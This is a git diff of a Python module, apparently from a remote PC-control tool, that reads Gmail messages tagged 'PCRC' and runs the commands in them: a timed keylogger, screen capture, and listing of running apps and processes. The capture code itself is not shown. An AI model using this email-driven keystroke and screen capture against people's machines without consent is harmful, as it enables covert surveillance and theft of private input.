@@ -10,102 +10,38 @@ from google_auth_oauthlib.flow import InstalledAppFlow
 from googleapiclient.discovery import build
 from googleapiclient.errors import HttpError
 
+from ..gmail_api import readMails, sendMail
+
 # If modifying these scopes, delete the file token.json.
 SCOPES = ["https://mail.google.com/"]
 
-
 def handle(myAr):
     print("Handling Mail")
+    import re
+    # Define the pattern using regular expression
+    pattern = re.compile(r"^\[key_logger-(\d|\d\d|\d\d\d)\]$")
     for task in myAr:
-        if task == "[key_logger]":
-            service.keylogger()
-        if task == "[screen_capture]":
+        # Use the pattern to search for matches in the string
+        match = pattern.match(task)
+        if match:
+            service.keylogger( int( match.group(1) ) )
+        elif task == "[screen_capture]":
             service.screenshot()
-        if task == "[list_app]":
+        elif task == "[list_apps]":
             service.listRunningApplication()
-        if task == "[list_processes]":
+        elif task == "[list_processes]":
             service.listRunningProcess()
 
 
 # def testoutput():
 #     print("hello may cau")
 
+def send():
+    sendMail(receiver='')
 
 def CheckMail(creds):
-    try:
-        service = build("gmail", "v1", credentials=creds)
-        results = (
-            service.users()
-            .messages()
-            .list(
-                userId="me",
-                labelIds=["INBOX", "UNREAD"],
-                includeSpamTrash="false",
-                q="PCRC",
-            )
-            .execute()
-        )
-        messages = results.get("messages", [])
-        if not messages:
-            print("No new messages.")
-        else:
-            for message in messages:
-                msg = (
-                    service.users()
-                    .messages()
-                    .get(userId="me", id=message["id"])
-                    .execute()
-                )
-                email_data = msg["payload"]["headers"]
-                for values in email_data:
-                    name = values["name"]
-                    if name == "From":
-                        from_name = values["value"]
-                        if msg["payload"].get("parts", -1) != -1:
-                            for part in msg["payload"]["parts"]:
-                                try:
-                                    data = part["body"]["data"]
-                                    byte_code = base64.urlsafe_b64decode(data)
-
-                                    text = byte_code.decode("utf-8")
-                                    if text.find("div") == -1:
-                                        myAr = text.splitlines()
-                                        handle(myAr)
-                                    # mark the message as read
-                                    msg = (
-                                        service.users()
-                                        .messages()
-                                        .modify(
-                                            userId="me",
-                                            id=message["id"],
-                                            body={"removeLabelIds": ["UNREAD"]},
-                                        )
-                                        .execute()
-                                    )
-                                except BaseException as error:
-                                    pass
-                        else:
-                            data = msg["payload"]["body"]["data"]
-                            byte_code = base64.urlsafe_b64decode(data)
-
-                            text = byte_code.decode("utf-8")
-                            myAr = text.splitlines()
-                            handle(myAr)
-                            # mark the message as read
-                            msg = (
-                                service.users()
-                                .messages()
-                                .modify(
-                                    userId="me",
-                                    id=message["id"],
-                                    body={"removeLabelIds": ["UNREAD"]},
-                                )
-                                .execute()
-                            )
-
-    except HttpError as error:
-        print(f"An error occurred: {error}")
-
+    myMsgs = readMails(Creds=creds, Service=None, sbj_mail='PCRC')
+    handle(myMsgs)
 
 def main():
     creds = None
